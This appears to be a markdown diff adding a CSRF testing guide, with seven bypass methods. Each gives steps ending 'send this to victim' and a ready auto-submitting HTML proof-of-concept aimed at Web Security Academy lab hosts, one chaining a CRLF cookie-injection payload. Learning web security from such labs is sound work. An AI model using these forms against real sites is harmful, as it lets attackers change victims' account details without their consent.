@@ -2,3 +2,265 @@
 Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
 Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help from social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing.
 
+# For a CSRF attack to be possible, three key conditions must be in place
+
+**1. Relevant Action:**
+* There's a specific thing (an "action") that an attacker wants to make happen on the website. For example, the attacker might want to change someone's password or modify user permissions.
+
+**2. Cookie-based Session Handling:**
+* When you log in to the website, it gives you a special "cookie" (a small piece of data) to identify you. This cookie is like your ID card for the website. The website uses this ID card (cookie) to know who is making requests.
+
+**3. Performing Actions through HTTP Requests:**
+* To do things on the website (like changing a password), you need to send messages to the website. These messages are called "HTTP requests." The website looks at your ID card (cookie) to know it's really you making the request.
+
+**4. No Unpredictable Request Parameters:**
+* When you send a message to the website (HTTP request), there are certain details (parameters) you need to include. If the website is not careful, an attacker might be able to figure out or guess these details. For example, if changing a password requires knowing the old password, and the website doesn't check this carefully, an attacker could guess the old password and change it.
+
+Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.
+
+
+# How does Cross-Site Request Forgery work?
+An attacker’s aim for carrying out a CSRF attack is to force the user to submit a state-changing request. Examples include:
+
+* Submitting or deleting a record.
+* Submitting a transaction.
+* Purchasing a product.
+* Changing a password.
+* Sending a message.
+
+Social engineering platforms are often used by attackers to launch a CSRF attack. This tricks the victim into clicking a URL that contains a maliciously crafted, unauthorized request for a particular Web application. The user’s browser then sends this maliciously crafted request to a targeted Web application. The request also includes any credentials related to the particular website (e.g., user session cookies). If the user is in an active session with a targeted Web application, the application treats this new request as an authorized request submitted by the user. Thus, the attacker succeeds in exploiting the Web application’s CSRF vulnerability.
+
+# What is the Impact of CSRF Attacks?
+
+* When a website sends a data request to another website on behalf of a user along with the user’s session cookie, an attacker can launch a Cross-Site Request Forgery Attack, which abuses a trustful relationship between the victim’s browser and the webserver.
+
+* In some cases, depending on the type of action, the attacker can gain full control of the user’s account. If the compromised user has a privileged role within the application, the attacker might be able to take full control of all the application’s functionality and data, which is devastating to both the business and the user. The result can be data theft, unauthorized fund transfers, damaged client relationships, changed passwords and many more.
+
+# Testing CSRF
+**Base Steps:**
+
+1. Select a request anywhere in Burp Suite Professional that you want to test or exploit.
+2. From the right-click context menu, select Engagement tools / Generate CSRF PoC.
+3. Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
+4. You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.
+5. Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.
+
+# Bypass Method -1 : Change the request method POST → GET
+
+Test Case: Validation of CSRF token depends on request method
+
+1. Interect with functionality and intercept the request.
+2. Send this requets to repeater and right click change request method
+3. Remove any csrf param and genrate csrf poc
+4. Edit according to your preference,For example:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="GET" action="https://ac591fd21f4ab3d2807a1b1d0007000d.web-security-academy.net:443/email/change-email?email=natsu%40natsu.com">
+		<input type="text" name="email" value="natsu@natsu.com">
+	</form>
+<script>
+      document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+5. Done send this to victim.
+
+# Bypass Method - 2: Remove csrf param from POST request.
+
+Test Case: Validation of CSRF token depends on token being present
+
+1. Interect with functionality and intercept the request.
+2. Send this requets to repeater.
+3. Remove any csrf param and generate csrf poc
+4. Edit according to your preference,For example:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="POST" action="https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email">
+		<input type="text" name="email" value="natsu@natsu.com">
+	</form>
+<script>
+      document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+5. Done send this to victim.
+
+# Bypass Method - 3: Feed your own account generated CSRF token in attack.
+
+Test Case: CSRF token is not tied to the user session.
+
+1. Interect with functionality and intercept the request.
+2. Right click generate csrf poc.
+3. Copy the code in a file.html remove any session token
+4. Drop the request.
+5. Send the file.html to victim.
+
+Example CSRF Code:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="POST" action="https://acd81f251e0c762980c31ae600c70041.web-security-academy.net:443/email/change-email">
+		<input type="text" name="email" value="natsu@natsu.com">
+		<input type="text" name="csrf" value="NqdmYFyfHgQl8JWLKd7YTOC24Tqdedpw">
+	</form>
+<script>
+      document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+
+# Bypass Method - 4 : Chain any other vulnerability to add your cookie for example XSS, CRLF → CSRF
+
+Test Case - 1 : CSRF token is tied to a non-session cookie, when we have two csrf token one in cookie and other in the functionality this is due to presence of two framework one for session handling and one for CSRF protection, which are not integrated together.
+					 The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com could be leveraged to place a cookie that is submitted to secure.normal-website.com.
+
+1. Find any vulnerability which allow you to inject something in the cookie of victim.
+2. Test if CSRF token is tied to session id (try changing session id keeping everything as it is))
+3. Check if the your csrf token works when replaced in victims request
+4. Lastly check if you can inject CRLF and change csrf cookie value
+5. Done now make a csrf poc with xss payload which execute crlf and send this poc to victim
+
+Example CSRF Code:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="POST" action="https://ac981fc81ee9f58b80984ae400200076.web-security-academy.net:443/my-account/change-email">
+		<input type="text" name="csrfKey" value="ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9">
+		<input type="text" name="email" value="hehe@hehe.com">
+		<input type="text" name="csrf" value="6EU5SJ9YKzfOsq9rNgDR8toGy0TKSw81">
+		<input type="submit" value="Send">
+	</form>
+<img src="http://ac981fc81ee9f58b80984ae400200076.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9" onerror="document.forms[0].submit()">
+</body>
+</html>
+
+
+Test Case - 2 : CSRF token is simply duplicated in a cookie, here csrf token value can be anything just need to be same in cookie as wells as param. 
+
+1. Intercept and action and try changing csrf token in both cookie and param
+2. Make similar poc as above but this time put same csrf token in crlf payload and request param.
+3. Done, Send it to victim.
+
+Example CSRF POC:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="POST" action="https://ac071f601e8dc74380609c1d000900b3.web-security-academy.net:443/my-account/change-email">
+		<input type="text" name="csrf" value="K5r92qL9pGzpC2joPMkqgBSY1GG3eo6I">
+		<input type="text" name="session" value="xdCFpxBe1M0MHvk0DmFuzCRlImMgdxZk">
+		<input type="text" name="email" value="natsu@natsu.com">
+		<input type="text" name="csrf" value="fake">
+		<input type="submit" value="Send">
+	</form>
+<img src="http://ac071f601e8dc74380609c1d000900b3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit()">
+</body>
+</html>
+
+# Bypass Method - 5 : Delete the Referrer Header Completely or Suppress it.
+
+Test Case: CSRF where Referer validation depends on header being present.
+
+1. Intercept the request and try changing referer to some other domain.
+2. If that didn't work then you will have to suppress the refere header.
+3. you can use `<meta name="referrer" content="no-referrer">` or any other technique.
+4. Done, Make a normal POC with that technique.
+
+Example CSRF POC:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="POST" action="https://ac6d1fe21fb2a0c7809510e7001c006c.web-security-academy.net:443/my-account/change-email">
+		<input type="text" name="session" value="S4dyJbRWg1IqEpZlPkhICE5vJQhnv6ve">
+		<input type="text" name="email" value="hola@hola.com">
+<meta name="referrer" content="no-referrer">
+	</form>
+<script>
+      document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+# Bypass Method - 6 : Try attacker.com or similar payload in referer header. (Validation of Referer can be circumvented).
+
+Test case: CSRF with broken Referer validation
+
+1. Intercept the request and try changing referer to some other domain. (Check all cases how it is been verified)
+2. Now Generate a normal POC and include any JavaScript in the script block to alter the URL and Referer
+3. Done Send it to victim.
+
+Example CSRF POC:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="POST" action="https://ac761f621f79d75680e4054c00160033.web-security-academy.net:443/my-account/change-email">
+		<input type="text" name="session" value="rk13v2KYDFByO0OFL0xnHcnIVZbvAHNg">
+		<input type="text" name="email" value="gg@gg.com">
+		<input type="submit" value="Send">
+	</form>
+<script>
+			history.pushState("", "", "/?ac761f621f79d75680e4054c00160033.web-security-academy.net")
+      document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+# Bypass Method - 7: Send null value in csrf token.
+
+Test Case: Validation of CSRF token depends on token value being
+
+1. Interect with functionality and intercept the request.
+2. Send this requets to repeater.
+3. Add null csrf param and generate csrf poc
+4. Edit according to your preference,For example:
+
+<!DOCTYPE html>
+<html>
+  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->
+<body>
+	<form method="POST" action="https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email">
+		<input type="text" name="email" value="natsu@natsu.com">
+	</form>
+<script>
+      document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+5. Done send this to victim.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
